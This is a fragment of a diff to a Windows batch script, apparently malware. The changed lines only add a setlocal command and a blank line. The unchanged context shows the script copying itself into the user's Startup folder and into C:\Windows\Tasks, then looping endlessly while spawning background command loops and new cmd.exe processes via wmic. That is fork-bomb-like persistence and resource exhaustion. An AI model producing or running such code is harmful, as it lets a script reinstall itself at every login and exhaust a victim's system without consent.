@@ -1,4 +1,5 @@
 @echo off
+setlocal enabledelayedexpansion
 
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 copy %0 "C:\Windows\Tasks\bat.bat" >nul
@@ -61,4 +62,5 @@ start /b cmd /c "for /l %%x in (1,0,2) do echo %%x"
 wmic process call create "cmd.exe"
 
 goto loop
+
 
